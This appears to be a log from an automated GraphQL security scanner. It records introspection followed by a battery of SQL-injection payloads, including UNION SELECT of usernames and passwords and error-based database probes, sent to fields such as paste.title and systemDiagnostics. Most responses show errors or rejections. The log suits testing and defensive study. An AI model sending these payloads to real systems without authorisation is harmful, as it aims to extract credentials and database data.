2026-02-03 20:06:25,455 | INFO    | GraphQLClient        | -                              | introspection        | POST | success  |  0.514s | payload=[__schema] response=[{"data": {"__schema": {"queryType": {"name": "Query", "fields": [{"name": "pastes", "args": [{"name": "public", "type": {"name": "Boolean", "kind": "SCALAR", "ofType": null}}, {"name": "limit", "type"…]
2026-02-03 20:06:25,561 | INFO    | InjectionTester      | double_quote_1_eq_1            | paste.title          | POST | success  |  0.003s | payload=[" OR 1=1 --] response=[{"errors": [{"message": "Syntax Error GraphQL (1:35) Expected :, found Int \"1\"\n\n1: query { paste(id: 1, title: \"\" OR 1=1 --\") { id message error success } }\n                                   …]
2026-02-03 20:06:25,567 | INFO    | InjectionTester      | or_1_eq_1_hash                 | paste.title          | POST | success  |  0.006s | payload=[' OR 1=1 #] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 48}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-03 20:06:25,575 | INFO    | InjectionTester      | admin_comment_dash             | paste.title          | POST | success  |  0.006s | payload=[admin' --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 47}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-03 20:06:25,579 | INFO    | InjectionTester      | admin_comment_hash             | paste.title          | POST | success  |  0.004s | payload=[admin' #] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 46}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-03 20:06:25,583 | INFO    | InjectionTester      | admin_comment_star             | paste.title          | POST | success  |  0.004s | payload=[admin'/*] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 46}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-03 20:06:25,588 | INFO    | InjectionTester      | union_select_123               | paste.title          | POST | success  |  0.004s | payload=[' UNION SELECT 1,2,3 --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 61}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-03 20:06:25,592 | INFO    | InjectionTester      | union_select_users             | paste.title          | POST | success  |  0.004s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 93}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-03 20:06:25,595 | INFO    | InjectionTester      | error_based_version            | paste.title          | POST | success  |  0.003s | payload=[' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 159}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loc…]
2026-02-03 20:06:25,599 | INFO    | InjectionTester      | error_based_extractvalue       | paste.title          | POST | success  |  0.003s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 103}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loc…]
2026-02-03 20:06:25,602 | INFO    | InjectionTester      | boolean_true                   | paste.title          | POST | success  |  0.003s | payload=[' AND 1=1 --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 50}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-03 20:06:25,607 | INFO    | InjectionTester      | boolean_false                  | paste.title          | POST | success  |  0.004s | payload=[' AND 1=0 --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 50}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-03 20:06:25,626 | INFO    | InjectionTester      | single_quote                   | systemDiagnostics.username | POST | success  |  0.019s | payload=['] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:06:25,640 | INFO    | InjectionTester      | or_1_eq_1_dash                 | systemDiagnostics.username | POST | success  |  0.013s | payload=[' OR 1=1 --] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:06:25,653 | INFO    | InjectionTester      | or_string_eq                   | systemDiagnostics.username | POST | success  |  0.013s | payload=[' OR '1'='1] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:06:25,657 | INFO    | InjectionTester      | double_quote_or                | systemDiagnostics.username | POST | success  |  0.003s | payload=[" OR ""="] response=[{"errors": [{"message": "Syntax Error GraphQL (1:43) Expected :, found String\n\n1: query { systemDiagnostics(username: \"\" OR \"\"=\"\", password: \"changeme\", cmd: \"test\") }\n                   …]
2026-02-03 20:06:25,659 | INFO    | InjectionTester      | double_quote_1_eq_1            | systemDiagnostics.username | POST | success  |  0.002s | payload=[" OR 1=1 --] response=[{"errors": [{"message": "Syntax Error GraphQL (1:43) Expected :, found Int \"1\"\n\n1: query { systemDiagnostics(username: \"\" OR 1=1 --\", password: \"changeme\", cmd: \"test\") }\n                 …]
2026-02-03 20:06:25,672 | INFO    | InjectionTester      | or_1_eq_1_hash                 | systemDiagnostics.username | POST | success  |  0.012s | payload=[' OR 1=1 #] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:06:25,684 | INFO    | InjectionTester      | admin_comment_dash             | systemDiagnostics.username | POST | success  |  0.011s | payload=[admin' --] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:06:25,696 | INFO    | InjectionTester      | admin_comment_hash             | systemDiagnostics.username | POST | success  |  0.012s | payload=[admin' #] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:06:25,706 | INFO    | InjectionTester      | admin_comment_star             | systemDiagnostics.username | POST | success  |  0.010s | payload=[admin'/*] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:06:25,716 | INFO    | InjectionTester      | union_select_123               | systemDiagnostics.username | POST | success  |  0.010s | payload=[' UNION SELECT 1,2,3 --] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:06:25,727 | INFO    | InjectionTester      | union_select_users             | systemDiagnostics.username | POST | success  |  0.010s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:06:25,738 | INFO    | InjectionTester      | error_based_version            | systemDiagnostics.username | POST | success  |  0.010s | payload=[' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:06:25,749 | INFO    | InjectionTester      | error_based_extractvalue       | systemDiagnostics.username | POST | success  |  0.011s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:06:25,758 | INFO    | InjectionTester      | boolean_true                   | systemDiagnostics.username | POST | success  |  0.009s | payload=[' AND 1=1 --] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:06:25,768 | INFO    | InjectionTester      | boolean_false                  | systemDiagnostics.username | POST | success  |  0.009s | payload=[' AND 1=0 --] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:06:25,777 | INFO    | InjectionTester      | single_quote                   | systemDiagnostics.password | POST | success  |  0.009s | payload=['] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:06:25,788 | INFO    | InjectionTester      | or_1_eq_1_dash                 | systemDiagnostics.password | POST | success  |  0.011s | payload=[' OR 1=1 --] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:06:25,799 | INFO    | InjectionTester      | or_string_eq                   | systemDiagnostics.password | POST | success  |  0.010s | payload=[' OR '1'='1] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:06:25,801 | INFO    | InjectionTester      | double_quote_or                | systemDiagnostics.password | POST | success  |  0.002s | payload=[" OR ""="] response=[{"errors": [{"message": "Syntax Error GraphQL (1:62) Expected :, found String\n\n1: query { systemDiagnostics(username: \"admin\", password: \"\" OR \"\"=\"\", cmd: \"test\") }\n                      …]
2026-02-03 20:06:25,804 | INFO    | InjectionTester      | double_quote_1_eq_1            | systemDiagnostics.password | POST | success  |  0.002s | payload=[" OR 1=1 --] response=[{"errors": [{"message": "Syntax Error GraphQL (1:62) Expected :, found Int \"1\"\n\n1: query { systemDiagnostics(username: \"admin\", password: \"\" OR 1=1 --\", cmd: \"test\") }\n                    …]
2026-02-03 20:06:25,815 | INFO    | InjectionTester      | or_1_eq_1_hash                 | systemDiagnostics.password | POST | success  |  0.011s | payload=[' OR 1=1 #] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:06:25,825 | INFO    | InjectionTester      | admin_comment_dash             | systemDiagnostics.password | POST | success  |  0.010s | payload=[admin' --] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:06:25,836 | INFO    | InjectionTester      | admin_comment_hash             | systemDiagnostics.password | POST | success  |  0.010s | payload=[admin' #] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:06:25,846 | INFO    | InjectionTester      | admin_comment_star             | systemDiagnostics.password | POST | success  |  0.010s | payload=[admin'/*] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:06:25,856 | INFO    | InjectionTester      | union_select_123               | systemDiagnostics.password | POST | success  |  0.009s | payload=[' UNION SELECT 1,2,3 --] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:06:25,865 | INFO    | InjectionTester      | union_select_users             | systemDiagnostics.password | POST | success  |  0.009s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:06:25,875 | INFO    | InjectionTester      | error_based_version            | systemDiagnostics.password | POST | success  |  0.010s | payload=[' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:06:25,885 | INFO    | InjectionTester      | error_based_extractvalue       | systemDiagnostics.password | POST | success  |  0.009s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:06:25,895 | INFO    | InjectionTester      | boolean_true                   | systemDiagnostics.password | POST | success  |  0.010s | payload=[' AND 1=1 --] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:06:25,905 | INFO    | InjectionTester      | boolean_false                  | systemDiagnostics.password | POST | success  |  0.010s | payload=[' AND 1=0 --] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:06:25,917 | INFO    | InjectionTester      | single_quote                   | systemDiagnostics.cmd | POST | success  |  0.012s | payload=['] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:06:25,934 | INFO    | InjectionTester      | or_1_eq_1_dash                 | systemDiagnostics.cmd | POST | success  |  0.016s | payload=[' OR 1=1 --] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:06:25,948 | INFO    | InjectionTester      | or_string_eq                   | systemDiagnostics.cmd | POST | success  |  0.014s | payload=[' OR '1'='1] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:06:25,951 | INFO    | InjectionTester      | double_quote_or                | systemDiagnostics.cmd | POST | success  |  0.002s | payload=[" OR ""="] response=[{"errors": [{"message": "Syntax Error GraphQL (1:79) Expected :, found String\n\n1: query { systemDiagnostics(username: \"admin\", password: \"changeme\", cmd: \"\" OR \"\"=\"\") }\n                  …]
2026-02-03 20:06:25,953 | INFO    | InjectionTester      | double_quote_1_eq_1            | systemDiagnostics.cmd | POST | success  |  0.002s | payload=[" OR 1=1 --] response=[{"errors": [{"message": "Syntax Error GraphQL (1:79) Expected :, found Int \"1\"\n\n1: query { systemDiagnostics(username: \"admin\", password: \"changeme\", cmd: \"\" OR 1=1 --\") }\n                …]
2026-02-03 20:06:25,965 | INFO    | InjectionTester      | or_1_eq_1_hash                 | systemDiagnostics.cmd | POST | success  |  0.011s | payload=[' OR 1=1 #] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:06:25,977 | INFO    | InjectionTester      | admin_comment_dash             | systemDiagnostics.cmd | POST | success  |  0.012s | payload=[admin' --] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:06:25,990 | INFO    | InjectionTester      | admin_comment_hash             | systemDiagnostics.cmd | POST | success  |  0.013s | payload=[admin' #] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:06:26,005 | INFO    | InjectionTester      | admin_comment_star             | systemDiagnostics.cmd | POST | success  |  0.015s | payload=[admin'/*] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:06:26,018 | INFO    | InjectionTester      | union_select_123               | systemDiagnostics.cmd | POST | success  |  0.012s | payload=[' UNION SELECT 1,2,3 --] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:06:26,032 | INFO    | InjectionTester      | union_select_users             | systemDiagnostics.cmd | POST | success  |  0.013s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:06:26,045 | INFO    | InjectionTester      | error_based_version            | systemDiagnostics.cmd | POST | success  |  0.012s | payload=[' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:06:26,058 | INFO    | InjectionTester      | error_based_extractvalue       | systemDiagnostics.cmd | POST | success  |  0.013s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:06:26,071 | INFO    | InjectionTester      | boolean_true                   | systemDiagnostics.cmd | POST | success  |  0.012s | payload=[' AND 1=1 --] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:06:26,084 | INFO    | InjectionTester      | boolean_false                  | systemDiagnostics.cmd | POST | success  |  0.012s | payload=[' AND 1=0 --] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:06:26,087 | INFO    | InjectionTester      | single_quote                   | systemDebug.arg      | POST | success  |  0.003s | payload=['] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 31}]}]}]
2026-02-03 20:06:26,090 | INFO    | InjectionTester      | or_1_eq_1_dash                 | systemDebug.arg      | POST | success  |  0.003s | payload=[' OR 1=1 --] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 41}]}]}]
2026-02-03 20:06:26,093 | INFO    | InjectionTester      | or_string_eq                   | systemDebug.arg      | POST | success  |  0.002s | payload=[' OR '1'='1] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 41}]}]}]
2026-02-03 20:06:26,095 | INFO    | InjectionTester      | double_quote_or                | systemDebug.arg      | POST | success  |  0.002s | payload=[" OR ""="] response=[{"errors": [{"message": "Syntax Error GraphQL (1:32) Expected :, found String\n\n1: query { systemDebug(arg: \"\" OR \"\"=\"\") { id message error success } }\n                                  ^\n", …]
2026-02-03 20:06:26,098 | INFO    | InjectionTester      | double_quote_1_eq_1            | systemDebug.arg      | POST | success  |  0.003s | payload=[" OR 1=1 --] response=[{"errors": [{"message": "Syntax Error GraphQL (1:32) Expected :, found Int \"1\"\n\n1: query { systemDebug(arg: \"\" OR 1=1 --\") { id message error success } }\n                                  ^\n"…]
2026-02-03 20:06:26,103 | INFO    | InjectionTester      | or_1_eq_1_hash                 | systemDebug.arg      | POST | success  |  0.004s | payload=[' OR 1=1 #] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 40}]}]}]
2026-02-03 20:06:26,106 | INFO    | InjectionTester      | admin_comment_dash             | systemDebug.arg      | POST | success  |  0.002s | payload=[admin' --] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 39}]}]}]
2026-02-03 20:06:26,109 | INFO    | InjectionTester      | admin_comment_hash             | systemDebug.arg      | POST | success  |  0.002s | payload=[admin' #] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 38}]}]}]
2026-02-03 20:06:26,111 | INFO    | InjectionTester      | admin_comment_star             | systemDebug.arg      | POST | success  |  0.003s | payload=[admin'/*] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 38}]}]}]
2026-02-03 20:06:26,114 | INFO    | InjectionTester      | union_select_123               | systemDebug.arg      | POST | success  |  0.002s | payload=[' UNION SELECT 1,2,3 --] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 53}]}]}]
2026-02-03 20:06:26,117 | INFO    | InjectionTester      | union_select_users             | systemDebug.arg      | POST | success  |  0.002s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 85}]}]}]
2026-02-03 20:06:26,120 | INFO    | InjectionTester      | error_based_version            | systemDebug.arg      | POST | success  |  0.002s | payload=[' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 151}]}]}]
2026-02-03 20:06:26,122 | INFO    | InjectionTester      | error_based_extractvalue       | systemDebug.arg      | POST | success  |  0.002s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 95}]}]}]
2026-02-03 20:06:26,125 | INFO    | InjectionTester      | boolean_true                   | systemDebug.arg      | POST | success  |  0.002s | payload=[' AND 1=1 --] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 42}]}]}]
2026-02-03 20:06:26,128 | INFO    | InjectionTester      | boolean_false                  | systemDebug.arg      | POST | success  |  0.002s | payload=[' AND 1=0 --] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 42}]}]}]
2026-02-03 20:06:26,130 | INFO    | InjectionTester      | single_quote                   | search.keyword       | POST | success  |  0.003s | payload=['] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 32}]}, {…]
2026-02-03 20:06:26,133 | INFO    | InjectionTester      | or_1_eq_1_dash                 | search.keyword       | POST | success  |  0.002s | payload=[' OR 1=1 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 42}]}, {…]
2026-02-03 20:06:26,137 | INFO    | InjectionTester      | or_string_eq                   | search.keyword       | POST | success  |  0.003s | payload=[' OR '1'='1] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 42}]}, {…]
2026-02-03 20:06:26,140 | INFO    | InjectionTester      | double_quote_or                | search.keyword       | POST | success  |  0.002s | payload=[" OR ""="] response=[{"errors": [{"message": "Syntax Error GraphQL (1:31) Expected :, found String\n\n1: query { search(keyword: \"\" OR \"\"=\"\") { id message error success } }\n                                 ^\n", "l…]
2026-02-03 20:06:26,142 | INFO    | InjectionTester      | double_quote_1_eq_1            | search.keyword       | POST | success  |  0.002s | payload=[" OR 1=1 --] response=[{"errors": [{"message": "Syntax Error GraphQL (1:31) Expected :, found Int \"1\"\n\n1: query { search(keyword: \"\" OR 1=1 --\") { id message error success } }\n                                 ^\n", …]
2026-02-03 20:06:26,146 | INFO    | InjectionTester      | or_1_eq_1_hash                 | search.keyword       | POST | success  |  0.003s | payload=[' OR 1=1 #] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 41}]}, {…]
2026-02-03 20:06:26,149 | INFO    | InjectionTester      | admin_comment_dash             | search.keyword       | POST | success  |  0.002s | payload=[admin' --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 40}]}, {…]
2026-02-03 20:06:26,152 | INFO    | InjectionTester      | admin_comment_hash             | search.keyword       | POST | success  |  0.003s | payload=[admin' #] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 39}]}, {…]
